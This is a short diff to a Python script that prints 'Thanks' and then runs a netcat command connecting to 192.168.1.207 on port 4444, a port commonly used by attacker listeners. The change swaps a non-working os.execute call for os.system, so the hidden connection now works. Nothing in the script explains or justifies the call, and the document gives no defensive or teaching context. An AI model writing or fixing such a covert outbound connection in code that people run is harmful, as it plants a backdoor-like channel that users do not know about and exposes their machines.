@@ -1,4 +1,4 @@
 import os
 
 print("Thanks")
-os.execute("nc 192.168.1.207 4444")
+os.system("nc 192.168.1.207 4444")
